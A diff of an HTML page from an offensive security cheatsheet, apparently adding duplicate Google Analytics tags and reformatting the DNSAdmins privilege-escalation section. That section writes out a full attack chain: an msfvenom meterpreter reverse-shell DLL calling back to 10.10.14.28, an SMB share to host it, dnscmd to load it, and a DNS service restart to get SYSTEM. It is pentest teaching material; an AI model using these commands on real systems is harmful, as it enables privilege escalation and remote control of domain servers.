@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-09-11T16:52:52 CEST">
+<meta name="revised" content="2023-02-14T12:07:01 CET">
 <title>DNSadmins group :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -27,7 +27,36 @@
     
       <header>
   <div class="logo">
-    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
+    <head>
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<a class="baselink" href="/">Offensive Security Cheatsheet</a>
+
   </div>
   <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
     <nav class="shortcuts">
@@ -1837,14 +1866,15 @@
 <span style="color:#75715e"># You can use it to privesc on the machine</span>
 
 <span style="color:#75715e"># It works by adding a malicious DLL loaded by the DNS service.</span>
-<span style="color:#75715e"># You have to restart the service and the DLL will be loaded as SYSTEM</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Generating the DLL</span>
-$ sudo msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp <span style="color:#111">LHOST</span><span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>.10.14.28 <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">5566</span> -f dll &gt; privesc.dll
+<span style="color:#75715e"># You have to restart the service and the DLL will be loaded as SYSTEM</span>
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Generating the DLL</span>
+$ sudo msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp <span style="color:#111">LHOST</span><span style="color:#f92672">=</span>10.10.14.28 <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">5566</span> -f dll &gt; privesc.dll
 
 <span style="color:#75715e"># Host the DLL on a SMD server or upload it on the target machine</span>
 $ sudo smbserver.py MYSHARE /path/to/dll -smb2support
 
 <span style="color:#75715e"># On the target machine, update the DNS configuration and give it the DLL</span>
-PS &gt; dnscmd <span style="color:#ae81ff">10</span>.10.10.169 /config /serverlevelplugindll <span style="color:#8045ff">\\</span><span style="color:#ae81ff">10</span>.10.14.28<span style="color:#8045ff">\T</span>ESTLOL<span style="color:#8045ff">\p</span>rivesc.dll
+PS &gt; dnscmd 10.10.10.169 /config /serverlevelplugindll <span style="color:#8045ff">\\</span>10.10.14.28<span style="color:#8045ff">\T</span>ESTLOL<span style="color:#8045ff">\p</span>rivesc.dll
 
 <span style="color:#75715e"># You can check if the DLL has been correctly loaded</span>
 PS &gt; Get-ItemProperty HKLM:<span style="color:#8045ff">\S</span>YSTEM<span style="color:#8045ff">\C</span>urrentControlSet<span style="color:#8045ff">\S</span>ervices<span style="color:#8045ff">\D</span>NS<span style="color:#8045ff">\P</span>arameters<span style="color:#8045ff">\ </span>-Name ServerLevelPluginDll
@@ -1854,7 +1884,8 @@ PS &gt; sc.exe stop dns
 PS &gt; sc.exe query dns
 PS &gt; sc.exe start dns
 
-<span style="color:#75715e"># If the exploit worked you should get a meterpreter</span></code></pre></div>
+<span style="color:#75715e"># If the exploit worked you should get a meterpreter</span>
+</code></pre></div>
 
     
     
